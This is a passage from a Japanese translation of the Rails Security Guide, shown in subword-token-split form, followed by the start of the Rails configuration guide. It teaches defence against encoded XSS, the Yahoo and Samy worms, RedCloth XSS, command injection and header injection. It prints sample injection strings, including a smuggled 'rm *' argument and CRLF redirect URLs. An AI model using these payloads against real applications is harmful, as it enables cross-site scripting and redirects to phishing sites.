▁しかし これは Web アプリケーション にとって は 新 た な 脅 威 となる かもしれません 。 異なる コード で エンコード された 中に 、 ブラウザで は 処理 可能 だ が サーバー では 処理 され ない ような 悪意のある コードが 潜 んで いる か も し れ ない からです 。
▁ UT F - 8 による 攻撃 方法 の例 を以下に示します 。
▁< I M G ▁S R C = & # 10 6 ; & # 9 7 ; & # 1 18 ; & # 9 7 ; & # 1 15 ; & # 99 ; & # 1 14 ; & # 10 5 ; & # 1 12 ; & # 1 16 ; & # 5 8 ; & # 9 7 ;
▁ & # 10 8 ; & # 10 1 ; & # 1 14 ; & # 1 16 ; & # 4 0 ; & # 3 9 ; & # 88 ; & # 8 3 ; & # 8 3 ; & # 3 9 ; & # 4 1 ; >
▁上の 例 を実行すると メッセージ ボックス が表示されます 。
▁なお 、 これは 上の sanitize ( ) フィルタ で 認 識 されます 。
▁[ H ack ver to r ]( https :// h ack ver to r . co . u k / public ) は 文字列 の 難 読 化 と エンコード を行なう 優 れ た ツール であり 、「 敵 を 知 る 」 の に 最 適 です 。
▁Rails の sanitize ( ) メソッドは 、 このような エ ン コ ー デ ィ ング 攻撃 を か わ す 働 き を します 。
▁#### ▁ 実際の 攻撃 例
▁ _ 近 年 における Web アプリケーション への 攻撃 を理解する ために 、 実際の 攻撃 例 を ご 紹 介 します 。
▁ 以下 は [ J s . Y am an n er @ m ]( http :// www . s y ma n te c . com / security _ response / write up . js p ? doc id = 200 6 - 06 12 11 - 4 1 11 - 99 & t a b id = 1 ) ▁ Y a h oo ! ▁ Mail ▁[ ワーム ]( http :// g r oo v in . net / st u f f / y am m er . t x t ) ▁ から の 抜 粋 です 。
▁この 攻撃 は 200 6 年 6 月 11 日 に 行われた もの で 、 Web メール インターフェイス を使用する ワーム の最初の 事 例 です 。
▁< im g ▁src =' http :// us . i 1 . y im g . com / us . y im g . com / i / us / n t / ma / ma _ mail _ 1 . g if '
▁t ar get =" " on load =" v ar ▁ http _ request ▁= ▁false ; ▁ v ar ▁ E mail ▁= ▁' ' ;
▁ v ar ▁ ID L ist ▁= ▁' ' ; ▁ v ar ▁C R um b ▁= ▁' ' ; ▁f un c tion ▁ ma ke Request ( url , ▁F un c , ▁ M e th o d , P ar am ) ▁ { ▁ ...
▁この ワーム は Y a h oo の HTML / JavaScript フィルタ の 穴 を つ き ました 。 この フィルタ は 元 来 、 JavaScript が 仕 込 まれ る 可能性 のある t ar get 属性 と on load 属性 をすべて フィルタ する よう になっ ていました 。
▁しかし 残念ながら この フィルタ は 1 度 しか 実行 され なかった ため 、 ワーム が 潜 む on load 属性 が 除 去 され ずに そのまま 残 っ てしまい ました 。
▁この 事 例 から 、 ブラックリスト フィルタ が 完全に な ること は 永 遠 に あり え ないこと 、 そして HTML / JavaScript を Web アプリケーションで 許可 すること に 困 難 が 伴 う 理由 を お わかり いた だけ る と思います 。
▁ web mail ワーム の 他の 概念 実 証 的な 事 例 として N d u j a を 取り上げ ます 。
▁詳細については [ R o s ar io ▁ V al o tt a ' の 論 文 ]( http :// www . x s s ed . com / new s / 3 7 / N d u j a _ Connection _ A _ c r o s s _ web mail _ w or m _ X W W / ) を参照してください 。
▁ どちら の web mail ワーム も メールアドレスを 収 集 すること を 目的 と し ており 、 犯罪 的 ハ ッ カ ー が 不 正 な 収 入 を得る の に 使われ る ことがあります 。
▁20 06 年 12 月 、 実 在 する 3 4 , 000 人のユーザー 名 と パスワード が [ M y S p a ce への フ ィ ッ シ ング 攻撃 ]( http :// new s . net c r a f t . com / ar ch ive s / 200 6 / 10 / 27 / my space _ account s _ com pro m is ed _ by _ ph is her s . html ) によって 盗 み 出 されました 。
▁この 攻撃 では 「 login _ home _ index _ html 」 という 名前 を URL に 持つ プロファイル ページ が 捏 造 され 、 それ によって この URL は ユーザー から は 実 に もっと も ら しく 見え ました 。
▁ M y S p a ce の 本 物 の Web ページ コンテンツ は 特殊な HTML / CSS によって 覆 い 隠 され 、 独自の 偽 ログイン ページを 代りに 表示 しました 。
▁ M y S p a ce の S a my ワーム については 次の CSS インジェクション の 節 で説明します 。
▁### ▁ CSS インジェクション
▁INFO : ▁ _ CSS インジェクション は 実際には JavaScript の インジェクション である と 言 え ます 。 これは 、 I E や 特定の バージョンの S a fa ri など で 、 CSS に含まれる JavaScript の 実行 が 許可 されている からです 。
▁ CSS インジェクション の 説明 に 最 適 な のは 、 か の 有 名 な [ M y S p a ce ▁S a my ワーム ]( http :// n am b . la / p o p ul ar / te ch . html ) です 。
▁この ワーム は 、 攻撃者 である S a my の プロファイル ページ を開く だけで 自動的に S a my に 友 達 リクエストを 送信 する という ものです 。
▁ 他 愛 も ない いた ず ら だ った かもしれませんが 、 S a my の も と には 数 時間 のうち に 百 万 件 以上 の 友 達 リクエスト が 集 まり 、 それ によって M y S p a ce に 膨 大 な ト ラ フ ィ ッ ク が発生し て サイト が オフ ラ イン になってしまい ました 。
▁ 以下 はこの ワーム に関する 技術 的な 解 説 です 。
▁ M y S p a ce では 多くの タグ を ブロック していました が 、 CSS については 禁 止 して い なかった ので 、 ワーム の 作 者 は CSS に 以下のような JavaScript を 仕 込 み ました 。
▁< div ▁ style =" b ack g r ound : url (' javascript : alert (1) ') ">
▁ここで スクリプト の 正 味 の 部分 ( ペ イ ロー ド ) は style 属性 に 置かれます 。
▁ 一 重 引 用 符 と 二 重 引 用 符 が 既に 両方 使用されている ので 、 この ペ イ ロー ド では 引 用 符 が 使用 できません 。
▁しかし JavaScript には どんな 文字列 も コード として 実行 でき てしまう eval ( ) 関数 があります 。 この 関数 は 強 力 ですが 危 険 です 。
▁< div ▁id =" my code " ▁ ex p r =" alert (' ha h ! ') "
▁ style =" b ack g r ound : url (' javascript : eval ( document . all . my code . ex p r ) ') ">
▁ eval ( ) 関数 は ブラックリスト ベース の 入力 フィルタ の実装 者 にとって は 悪 夢 のような ものです 。 この 関数 を 使われ てしまう と 、 たとえば 以下のように 「 in n er HTML 」 という 単 語 を style 属性 に 隠 しておく ことができ てしまう からです 。
▁ alert ( eval (' document . body . in n e ' ▁+ ▁' r HTML ') ) ;
▁ 次の 問題 は 、 M y S p a ce は " javascript " という 単 語 を フィルタ していました が 、「 j a v a & lt ; N E W L IN E & g t ; script 」 と 書くこと で この フィルタ を 回 避 でき て し ま った ことで した 。
▁ 次の 問題 は 、 ワーム の 作 者 が CSRF セキュリティ トークン を 利用 して いた ことで した 。
▁これ が なければ 友 達 リクエストを ば ら ま く ということ は できない 相 談 だ った でしょう 。
▁ ワーム 作 者 は 、 ユーザー が追加され る 直 前に ページに 送信された GET リクエスト の 結果を 解 析 して CSRF トークン を 得 ていました 。
▁ 最終的に 4 K B サイズ の ワーム が でき あ が り 、 作 者 は 自分の プロファイル ページに これを 注 入 しました 。
▁[ m o z - bin d ing ]( http :// www . sec ur it e am . com / security new s / 5 L P 0 5 1 F H P E . html ) という CSS プロ パ テ ィ は 、 Firefox などの G ec ko ベース の ブラウザで は CSS 経由で JavaScript を 注 入 する手段 になる 可能性 がある ことが 判 明 しています 。
▁ 繰り返し ます が 、 ブラックリスト による フィルタ は 永 遠 に 不 完全な ま ま に し かなり ません 。
▁ _ Web アプリケーションの 色 や 画像 を カスタマイズ できるように したい のであれば 、 ユーザーに 色 や 画像 を 選 ば せ 、 Web アプリケーションの 側 で CSS を ビ ル ド する ように しましょう _ ▁ 。 ユーザーが CSS を直接 カスタマイズ できる ような 作り には しないでください 。
▁ どう しても 必要 であれば 、 ホワイトリスト ベース の CSS フィルタ として Rails の ` sanitize ( ) ` メソッド を使用する こともできます 。
▁### ▁ テ キ スタイル インジェクション
▁ セキュリティ上の 理由 から HTML 以外の テキスト フォーマット 機能を 提供し たい のであれば 、 何らかの マークアップ 言語 を 採 用 し 、 それ を サーバー 側 で HTML に変換 するようにしてください 。
▁[ Re d C lo th ]( http :// re d c lo th . org / ) は Ruby 用 に 開発 された マークアップ 言語 の 一 種 ですが 、 気 を 付け て 使用 しない と XSS に対して も 脆 弱 になります 。
▁ 例 を 挙 げ ます 。 Re d C lo th は ▁` _ test _ ` という マークアップ を & lt ; e m & g t ; test & lt ; e m & g t ; に変換 します 。 この 箇所 の テキスト は イ タ リ ッ ク になります 。
▁しかし 、 執 筆 当 時の 最 新 バージョン である 3.0 . 4 まで の Re d C lo th は XSS に 関 しても 脆 弱 で した 。
▁この 重 大 な バグ を 取り 除 く には [ 最新の バージョン 4 ]( http :// www . re d c lo th . org ) を 入 手 してください 。
▁しかし 新しい バージョン にも [ 若 干 の セキュリティ バグ ]( http :// www . r or security . info / j our n al / 200 8 / 10 /1 3 / new - re d c lo th - security . html ) がある ため 、 対応策 は 未 だ に 欠 か せ ません 。
▁ バージョン 3.0 . 4 の例 を以下に示します 。
▁ Re d C lo th . new (' < script > alert (1) </ script > ') . to _ html
▁# ▁=> ▁" < script > alert (1) </ script > "
▁ テ キ スタイル プロ セ ッ サ によって 作成 されていない HTML を 除 去 するには 、 : filter _ html オプション を使用して ください 。
▁ Re d C lo th . new (' < script > alert (1) </ script > ', ▁ [: filter _ html ] ). to _ html
▁# ▁=> ▁" alert (1) "
▁ただし このメソッド では 、 仕 様 上 一部の HTML タグ ( & lt ; a & g t ; など ) が 除 去 されません 。
▁ Re d C lo th . new (" < a ▁ href =' javascript : alert (1) ' > hello </ a > ", ▁ [: filter _ html ] ). to _ html
▁# ▁=> ▁" < p >< a ▁ href =" javascript : alert (1) "> hello </ a ></ p > "
▁ XSS 対応策 で 既に 述 べ た とおり 、 _ Re d C lo th は 必ず ホワイトリスト フィルタ と 組み合わせ て 使用 してください _ ▁ 。
▁### ▁ Ajax インジェクション
▁NOT E : ▁ _ 通常の Web アプリケーション 開発 上で 必要となる セキュリティ上の 注意 と同様 の 注意 が Ajax に対して も 必要 です 。
▁ただし 1 つ 例外 があります 。 ページ ヘ の 出力 は 、 アクション が ビュー を レンダリング し ない場合 であっても エスケープ されている 必要があります 。
▁ も し XSS で 汚 染 された 文字列 が 戻り値 に 含 まれ ている と 、 ブラウザで 表示 された ときに 悪意のある コードが 実行 され てしまいます 。
▁ すべての 入力 値 は 、 h ( ) メソッドを使用して エスケープ してください 。
▁### ▁ コマンドライン インジェクション
▁NOT E : ▁ _ ユーザーが 入力 した データを コマンドライン の オプション に 使用する 場合は 十分 に 注意 してください 。
▁Web アプリケーション が 背 後 の OS コマンド を実行し なければならない 場合 、 Ruby には ` ex ec ( コマンド ) `、` s y sc all ( コマンド ) `、` s y st e m ( コマンド ) ` 、 そして バ ッ ク ク ォ ート 記 法 という 方法 が 用意されてい ます 。
▁これ の コマンド 全体 または 一 部 に ユーザー 入力 が 使用される ようなこと がある場合 、 特に 注意 が必要です 。
▁これは 、 ほとんど の シ ェ ル では 、 コマンド に セ ミ コ ロ ン ; や 垂 直 バー | を追加する ことで 、 別の コマンド を簡単に 結合 する ことができ てしまう ためです 。
▁ 対応策 は 、 ▁ _ コマンドライン の パラメータ を 安全 に 渡 せる ` s y st e m ( コマンド , ▁ パラメータ ) ` メソッド を使用すること です 。 _
▁ s y st e m (" / bin / e ch o ", " hello ; ▁ rm ▁* ")
▁# ▁" hello ; ▁ rm ▁* " を実行して も ファイルは 削除 され ない
▁### ▁ ヘッダー インジェクション
▁WARN ING : ▁ _ HTTP ヘッダ は 動的 に 生成される もの であり 、 特定の 状 況 では ヘッダ に ユーザー 入力 が 注 入 される ことがあります 。
▁これ を使用して 、 に せ の リダイレクト 、 XSS 、 HTTP レスポンス 分割 攻撃 が行われ る 可能性があります 。
▁ HTTP リクエスト ヘッダ で 使用されている フィールド の中に は Re f er er 、 User - A g ent ▁( クライアント 側 ソフトウェア ) 、 Co o k i e フィールド があります 。
▁ Re s p on s e ヘッダー には 、 たとえば ステータス コード 、 Co o k i e フィールド 、 L o c ation フィールド ▁( リダイレクト 先 を表す ) ▁ があります 。
▁これらの フィールド 情報 は ユーザー 側 から 提供され る もの であり 、 さ ほど 手 間 を かけ ずに 操作 できてしまいます 。
▁ _ これらの フィールド も エスケープ するようにしてください 。
▁ _ ▁ エスケープ が 必要 になる のは 、 管理 画面 で User - A g ent ヘッダ を表示する 場合 など が 考え られます 。
▁さらに 、 ▁ _ ユーザー 入力 を 部分 的に 元 に した レスポンス ヘッダ を生成する ときに 、 自分 が 何 を している のか を 正しく 知 っ ておく ことが 重要です 。
▁ _ ▁たとえば 、 ユーザーを 特定の ページ へ リダイレクト して 戻 したい とします 。
▁このとき 、 " ref er er " フィールド を フォーム に 導入 して 、 指定 の アドレス に リダイレクト した とします 。
▁ redirect _ to ▁ params [: ref er er ]
▁ここで 、 Rails は その 文字列を L o c ation ヘッダ フィールド に 入 れ て 30 2 ( リダイレクト ) ステータス を ブラウザに送信 します 。
▁ 悪意のある ユーザーが このとき 最初に 行なう のは 、 以下のような 操作 です 。
▁ http :// www . y our application . com / controller / action ? ref er er = http :// www . ma li c io us . t l d
▁Rails ▁ 2.1 . 2 より 前 のバージョン ( および Ruby ) に含まれる バグ が 原 因 で 、 ハ ッ カ ー は 以下のように 任意の ヘッダ を 注 入 できてしまいます 。
▁ http :// www . y our application . com / controller / action ? ref er er = http :// www . ma li c io us . t l d % 0 d % 0 a X - H e ad er : + H i !
▁ http :// www . y our application . com / controller / action ? ref er er = path / at / y our / app % 0 d % 0 a L o c ation : + http :// www . ma li c io us . t l d
▁上の URL における " % 0 d % 0 a " は " \ r \ n " が URL エンコード された もの であり 、 Ruby における C R L F 文字 です 。
▁2 番目の 例 では 2 つ目の L o c ation ヘッダー フィールド が 1 つ目の もの を 上 書き する ため 、 以下のような HTTP ヘッダー が 生成されます 。
▁ HTTP /1 . 1 ▁ 30 2 ▁ M o v ed ▁ T e m p or ar il y
▁ (...)
▁ L o c ation : ▁ http :// www . ma li c io us . t l d
▁つまり 、 ▁ _ ヘッダー インジェクション における 攻撃 方法は 、 ヘッダー に C R L F 文字 を 注 入 する という もの な のです 。
▁ _ ▁ 攻撃者 は 偽 の リダイレクト で どんな ことができ てしまう の でしょう か 。
▁ 攻撃者 は 、 ユーザーを フ ィ ッ シ ング サイトに リダイレクト し ( フ ィ ッ シ ング サイトの 見 た 目 は 本 物 そ っ く り に 作 って お きます ) 、 ユーザーを 再度 ログイン させ て その ログイン 情報を 攻撃者 に 送信 することができます 。
▁ あるいは 、 フ ィ ッ シ ング サイト から ブラウザ の セキュリティ ホ ー ル を経由して 邪 悪 な ソフトウェア を 注 入 することもできます 。
▁Rails ▁ 2.1 . 2 では これらの 文字 を ` redirect _ to ` メソッドの L o c ation フィールド から エスケープ する ようになりました 。
▁ _ 他の ヘッダー フィールド で ユーザー 入力 を使用する場合 には 、 C R L F の エスケープ を 自分 で 実装 すること を 忘れ ないように してください 。
▁#### ▁ レスポンス 分割
▁ ヘッダー インジェクション が 実行 可能 になって し ま っている 場合 、 レスポンス 分割 ( response ▁ s p li tt ing ) 攻撃 も同様に 実行 可能 になっている 可能性があります 。
▁ HTTP の ヘッダー ブロック の 後 ろ には 2 つの C R L F が 置 か れ て ヘッダー ブロック の 終 了 を 示 し 、 その後 ろ に 実際の データ ( 通常 は HTML ) が 置かれます 。
▁ レスポンス 分割 とは 、 ヘッダー フィールド に 2 つの C R L F を 注 入 し 、 その後 ろ に 邪 悪 な HTML を 配置 する という 手法 です 。
▁このとき の レスポンス は以下のようになります 。
▁ HTTP /1 . 1 ▁ 30 2 ▁F ound ▁[ 最 初 は 通常の 30 2 レスポンス ]
▁ Date : ▁Tue , ▁ 12 ▁A p r ▁ 200 5 ▁ 22 : 0 9 : 07 ▁ G M T
▁ Content - Type : ▁ text / html
▁ HTTP /1 . 1 ▁ 200 ▁ O K ▁[ ここ より 下 は 攻撃者 によって 作成された 次の 新しい レスポンス ]
▁ & lt ; html & g t ; & lt ; f on t ▁c ol or = re d & g t ; h e y & lt ; / f on t & g t ; & lt ; / html & g t ; ▁[ 任意の 邪 悪 な 入力 が
▁ K e e p - A l ive : ▁ time out = 15 , ▁ ma x = 100 ▁ リダイレクト 先 の ページ として 表示される ]
▁ Connection : ▁ K e e p - A l ive
▁ Transfer - E n co d ing : ▁ ch un ke d
▁ 特定の 状 況 では 、 この 邪 悪 な HTML が 標的ユーザー の ブラウザで 表示される ことがあります 。
▁ただし 、 おそらく K e e p - A l ive 接続 が 有効 になっ ていない と この 攻撃 は 効 か ない でしょう 。 多くの ブラウザ は ワ ン タ イ ム 接続 を使用しています 。
▁ か と い って 、 K e e p - A l ive が 無効 になっている ことを 当 て にする わ け には い き ません 。
▁これは いずれ の場合 において も 重 大 な バグ です 。 ▁ _ ヘッダー インジェクション と レスポンス 分割 の 可能性 を 排 除 する ため 、 Rails を 2 . 0 . 5 または 2.1 . 2 に アップグレード する必要があります 。
▁ 安全 でない クエリ 生成
▁- ----------- -----------
▁ Rack が クエリ パラメータ を 解 析 ( p ar s e ) する方法 と Active ▁Record が パラメータ を 解 釈 する方法 の 組み合わせ に 問題 があり 、 where 句 が ` I S ▁ NULL ` の データベース クエリ を 本 来 の 意 図 に 反 して 生成 すること が 可能 になって し ま っています 。
▁( [ C V E - 20 12 - 2 6 6 0 ]( https :// group s . g oo g le . com / for um / # ! search in / rubyonrails - security / deep _ m un g e / rubyonrails - security / 8 S A - M 3 as 7 A 8 / M r 9 fi 9 X 4 k N g J ) , ▁[ C V E - 20 12 - 2 6 9 4 ]( https :// group s . g oo g le . com / for um / # ! search in / rubyonrails - security / deep _ m un g e / rubyonrails - security / j I L Z 3 4 t A H F 4 / 7 x 0 h L H - o 0 - I J ) ▁ および ▁[ C V E - 20 1 3 - 0 15 5 ]( https :// group s . g oo g le . com / for um / # ! search in / rubyonrails - security / C V E - 20 12 - 2 6 6 0 / rubyonrails - security / c 7 j T - E e N 9 e I / L 0 u 4 e 8 7 z Y G M J ) ) ▁ の セキュリティ 問題 への 対応 として 、 Rails の動作 を デフォルトで セキュア に するために ` deep _ m un g e ` メソッドが 導入 されました 。
▁` deep _ m un g e ` が 実行 され なかった 場合に 攻撃者 に 利用 される 可能性 のある 脆 弱 な コードの 例 を以下に示します 。
▁ unless ▁ params [: token ] . nil ?
▁ user ▁= ▁User . find _ by _ token ( params [: token ] )
▁ user . reset _ password !
▁` params [: token ] ` が ` [ ] `、` [ nil ] `、` [ nil , ▁nil , ▁ ... ] `、` [' foo ', ▁nil ] ` のいずれか の場合 、` nil ` チェック を パス する にも か か わ らず 、 where 句 が ` I S ▁ NULL ` または ` IN ▁( ' foo ', ▁ NULL ) ` になって SQL クエリ に追加 され てしまいます 。
▁Rails を デフォルトで セキュア に するために 、` deep _ m un g e ` メソッドは 一部の 値を ` nil ` に置き換え ます 。
▁ リクエスト で 送信された ` JSON ` ベース の パラメータ が どのように 見え る か を 以下の 表 に示します 。
▁| ▁ JSON ▁| ▁ パラメータ ▁|
▁| ---- --------------- ---------------- | ----------- --------------- |
▁| ▁` { ▁" person " : ▁ null ▁ } ` ▁| ▁` { ▁: person ▁=> ▁nil ▁ } ` ▁|
▁| ▁` { ▁" person " : ▁[ ] ▁ } ` ▁| ▁` { ▁: person ▁=> ▁nil ▁ } ` ▁|
▁| ▁` { ▁" person " : ▁[ null ] ▁ } ` ▁| ▁` { ▁: person ▁=> ▁nil ▁ } ` ▁|
▁| ▁` { ▁" person " : ▁[ null , ▁ null , ▁ ... ] ▁ } ` ▁| ▁` { ▁: person ▁=> ▁nil ▁ } ` ▁|
▁| ▁` { ▁" person " : ▁[" foo ", ▁ null ] ▁ } ` ▁| ▁` { ▁: person ▁=> ▁[" foo "] ▁ } ` ▁|
▁ リ ス ク と 取 扱 い 上の 注意 を 十分 理解 している 場合に 限 り 、` deep _ m un g e ` をオフに して アプリケーションを 従来 の動作 に 戻 す ことができます 。
▁config . action _ dispatch . perform _ deep _ m un g e ▁= ▁false
▁ デフォルトの ヘッダー
▁Rails アプリケーション から 受け 取 る すべての HTTP レスポンス には 、 以下の セキュリティ ヘッダー が デフォルトで 含まれています 。
▁config . action _ dispatch . default _ header s ▁= ▁ {
▁' X - F r am e - O p tion s ' ▁=> ▁' S A M E O R I G IN ',
▁' X - XSS - Pro te c tion ' ▁=> ▁' 1 ; ▁ mod e = block ',
▁' X - Content - Type - O p tion s ' ▁=> ▁' no s n if f '
▁ デフォルトの ヘッダー は ` config / application . rb ` で 設定 を変更 できます 。
▁' H e ad er - Name ' ▁=> ▁' H e ad er - V al u e ',
▁' X - F r am e - O p tion s ' ▁=> ▁' D E N Y '
▁ あるいは ヘッダー を 除 去 することもできます 。
▁config . action _ dispatch . default _ header s . clear
▁ よく 使用される ヘッダー の リスト を以下に示します 。
▁* ▁X - F r am e - O p tion s
▁' D E N Y ' を指定すると すべての フ レ ー ミ ング が 不 許可 になります 。 すべての Web サイト について フ レ ー ミ ング を 許可 するには ' A L L O W A L L ' を指定します 。
▁* ▁X - XSS - Pro te c tion
▁ XSS ▁A u d it or をオフに したい場合は ' 0 ; ' を指定します ( レスポンス が リクエスト パラメータ から の スクリプト を 含 んで いる 場合に 便利です )。
▁* ▁X - Content - Type - O p tion s
▁ _ ' no s n if f ' ▁ は Rails では デフォルト です 。 _ ▁- ▁ ファイルの M I M E タイプ を ブラウザ が 推測 しない ようにします 。
▁* ▁X - Content - S ec ur ity - P o li c y
▁[ コンテンツ タイプ を 読み込む 元の サイト を 制 御 するための 強力な メ カ ニ ズ ム ]( http :// w 3 c . github . io / web app sec / spec s / content - security - p o li c y / c s p - spec if i c ation . de v . html ) です 。
▁* ▁A c c ess - Control - A ll o w - O ri g in
▁ 同 一 生成 元 ポ リ シ ー の バ イ パス と ク ロ ス オ リ ジ ン ( c r o s s - origin ) リクエストを サイト ごとに 許可 します 。
▁* ▁S t ri ct - T r an s port - S ec ur ity
▁[ ブラウザから サイト への 接続 を セキュア な もの に 限 って 許可 する かどうかを指定します ]( http :// j a . w ikipedia . org / wiki / HTTP _ S t ri ct _ T r an s port _ S ec ur ity )
▁ 利用 環境 の セキュリティ
▁ ----------- -----------
▁ アプリケーションの コード や 実行 環境 を セキュア に する方法について は 、 本 ガイド の 範 疇 を 超 え ます 。
▁ただし 、` config / database . yml ` など に置かれ る データベース 接続 設定 や 、` config / secret s . yml ` など に置かれ る サーバー サ イ ド の 秘 密 キー の セキュリティ は 保 つ ように してください 。
▁これらの ファイル や 、 その他 重要な 情報 を含む 可能性 のある ファイルを 、 環境 に合わせて 複数の バージョン を 使い 分 け ること で さ ら な る アクセス 制限 を行なう ことができます 。
▁--------- -----------
▁ 激 しく 移 り 変わる セキュリティ の 動 向 に 常に 目 を 配 り 、 最新の 情報を 入 手 するようにしてください 。 新しく 登 場 した 脆弱性 を見 逃 す と 、 壊 滅 的な 損 害 を こう む る 可能性があります 。
▁Rails の セキュリティ 関連 の 追加 リソース を ご 紹 介 します 。
▁* ▁Ruby ▁on ▁Rails セキュリティ プロジェクト には 定 期 的に セキュリティ 情報 が 掲 載 されます : ▁[ http :// www . r or security . info ]( http :// www . r or security . info )
▁* ▁Rails セキュリティ ▁[ メ ー リ ング リスト ]( http :// group s . g oo g le . com / group / rubyonrails - security ) を 購 読 しましょう 。
▁* ▁[ アプリケーションの その他 の 層 についても 最 新 に 保 って ください ]( http :// sec un i a . com / ) ▁( 週 刊 の ニ ュ ー ス レ ター も 発 行 しています )
▁* ▁[ 優 れ た セキュリティ ブログ ]( http :// ha . c k er s . org / blog / ) には [ XSS チ ート シ ート ]( http :// ha . c k er s . org / x s s . html ) が 掲 載 されています 。
▁Rails ▁ アプリケーション を設定する
▁= = = ========= ========= =========
▁この ガイド では Rails アプリケーションで 利用 可能な 設定 と 初期化 機能 について 説明 いた します 。
▁* ▁Rails アプリケーションの 動作 を 調 整 する方法
▁* ▁ アプリケーション 開 始 時に 実行 したい コード を追加する 方法
▁ 初期化 コードの 置き場所
▁Rails には 初期化 コードの 置き場所 が 4 箇所 あります 。
▁* ▁` config / application . rb `
▁* ▁ 環境 に 応 じ た 設定 ファイル
▁* ▁ イニシャライザ
▁* ▁ ア フ ター イニシャライザ
▁Rails 実行 前に コード を実行する
▁--------- ----------------
▁ アプリケーションで 何らかの コードを 、 Rails 自体 が 読み込まれ る 前に 実行 する必要が 生じる ことが まれ に あります 。 その 場合は 、 実行 したい コードを ` config / application . rb ` ファイルの ` require ▁' rails / all ' ` 行 より 前に 書い てください 。
▁Rails コンポーネント を構成する
▁- ----------- ----------------
▁ 一般に 、 Rails の設定 作業 とは Rails 自身 を設定する ことで も ある と 同時に 、 Rails の コンポーネント を設定する ことで もあります 。
▁` config / application . rb ` および 環境 固有の 設定 ファイル ( ` config / environments / production . rb ` など ) に 設定 を 記 入 することで 、 Rails の すべての コンポーネント に それらの 設定 を 渡す ことができます 。
▁たとえば 、` config / application . rb ` ファイル には 以下の 設定 が 含まれています 。
▁config . autoload _ path s ▁+ = ▁% W ( # { config . root } / ext r as )
▁これは Rails 自身 のための 設定 です 。
▁ 設定 を すべての Rails コンポーネント に 渡 したい場合は 、` config / application . rb ` 内の 同じ ` config ` オブジェクト を使用して 行なう ことができます 。
▁config . active _ record . s ch e ma _ format ▁= ▁: ruby
▁この 設定 は 、 特に Active ▁Record の設定 に 使用されます 。
▁### ▁Rails 全 般 の設定
▁Rails 全 般 に対する 設定 を行う には 、` Rails :: R a il t i e ` オブジェクト を呼び出す か 、` Rails :: Engine ` や ` Rails :: Application ` の サブ クラス を呼び出します 。
▁* ▁` config . after _ initialize ` には ブロック を 渡す ことができます 。 この ブロック は 、 Rails による アプリケーションの 初期化 が完了し た ▁ _ 直 後 _ ▁ に 実行されます 。
▁ アプリケーションの 初期化 作業 には 、 フレームワーク 自体 の 初期化 、 エンジンの 初期化 、 そして ` config / initializers ` に 記述 された すべての アプリケーション イニシャライザ の 実行 が含まれ ます 。
▁ここで 渡す ブロック は rake タスク として _ 実行される _ ▁ ことにご注意ください 。
▁この ブロック は 、 他の イニシャライザ によって 設定 される 値 を設定する の に 便利です 。
▁config . after _ initialize ▁do
▁ ActionView :: Base . sanitize d _ allow ed _ tag s . delete ▁' div '
▁* ▁` config . asset _ host ` は アセット を 置 く ホスト を設定します 。
▁このメソッドは ` config . action _ controller . asset _ host ` を 短縮 した ものです 。
▁* ▁` config . autoload _ on ce _ path s ` は 、 サーバー への リクエスト ごとに ク リ ア され ない 定数 を 自動 読 込 する パス の配列 を 引数に 取り ます 。
▁この 設定 は ` config . cache _ classes ` が false の 場合に 影 響 を 受け ます 。 ` config . cache _ classes ` は development モード では ` config . cache _ classes ` はデフォルトで オフ です 。
▁` config . cache _ classes ` が true の場合 、 すべての ` config . autoload _ on ce _ path s ` 自動 読み込み は 一度 しか 行 わ れ ません 。
▁` config . autoload _ on ce _ path s ` の配列 に含まれる 要素 は 、 次 で 説明 する ` autoload _ path s ` にも まったく 同じ よう に含め ておく 必要があります 。
▁` config . autoload _ on ce _ path s ` の デフォルト値 は 、 空 の配列 です 。
▁* ▁` config . autoload _ path s ` は Rails が 定数 を 自動 読 込 する パス を含む 配列 を 引数に 取り ます 。
▁` config . autoload _ path s ` の デフォルト値 は 、` app ` 以下の すべての ディレクトリ です ( 訳 注 : ▁Rails 3 から は autoload _ path の設定 はデフォルトで は 無効 です )。
▁* ▁` config . cache _ classes ` は 、 アプリケーションの クラス や モジュール を リクエスト ごとに 再 読み込み するか ( = キャッシュ しない かどうか ) どう か を指定します 。
▁config . cache _ classes ` の デフォルト値 は 、 development モード では false なので コードの 更新 が すぐ 反 映 され 、 test モード と production モード では true なので 動作 が 高速 になります 。
▁* ▁` config . action _ view . cache _ template _ load ing ` は 、 リクエスト の たびに ビュー テンプレート を 再 読み込み するか ( = キャッシュ しない か ) を指定します 。
▁* ▁` config . beginning _ of _ week ` は 、 アプリケーション における 週 の 初 日 を設定します 。
▁ 引数に は 、 曜 日 を表す 正しい シンボル を 渡します ( `: m on day ` など )。
▁* ▁` config . cache _ store ` は Rails で の キャッシュ 処理 に 使用される キャッシュ スト ア を設定します 。
▁ 指定 できる オプションは 次の シンボル `: me m or y _ store `、` : file _ store `、` : me m _ cache _ store `、` : null _ store ` のいずれか 、 または キャッシュ API を実装する オブジェクト です 。
▁` t m p / cache ` ディレクトリ が存在する 場合 の デフォルト は `: file _ store ` に 設定 され 、 それ以外の 場合 の デフォルト は `: me m or y _ store ` に 設定 されます 。
▁* ▁` config . c ol or ize _ log g ing ` は 、 出力 する ログ 情報 に A N S I 色 情報 を与える かどうかを指定します 。
▁デフォルトは true です 。
▁* ▁` config . con s id er _ all _ request s _ local ` は フラグ です 。
▁この フラグ が true の場合 、 ど のような 種類 の エラーが発生し た場合 にも 詳 細 な デバッグ情報 が HTTP レスポンス に 出力 され 、 アプリケーションの 実行 時 コンテキスト が ` Rails :: In f o ` コントローラ によって ` / rails / info / pro per t ies ` に 出力 されます 。
▁この フラグ は development モード と test モード では true 、 production モード では false に 設定 されます 。
▁ もっと 細 か く 制 御 したい場合は 、 この フラグ を false に設定し て から 、 コントローラ で ` local _ request ?` メソッドを 実装 し 、 エラー 時に どの デバッグ情報 を出力する か を そこで 指定 してください 。
▁* ▁` config . console ` を使用すると 、 コンソール で ` rails ▁console ` を実行する 時に 使用される クラス を カスタマイズ できます 。
▁このメソッドは ` console ` ブロック で使用する の が 最 適 です 。
▁console ▁do
▁# ▁この ブロック は コンソール で 実行される とき しか 呼び出され ない
▁# ▁従って ここで p ry を 呼び出し ても 問題 ない
▁require ▁" p ry "
▁config . console ▁= ▁P ry
▁* ▁` config . dependency _ load ing ` を false に設定する と 、 定数 自動 読み込み 設定 をオフに します 。
▁この オプション が 効 く のは ` config . cache _ classes ` が true の場合 のみ です ( ` config . cache _ classes ` は production モード では デフォルトで true です )。
▁ ここに は アプリケーション 、 エンジン 、 Rails フレームワーク を含む あらゆる 登録 済み 名前空間 が含まれ ます 。
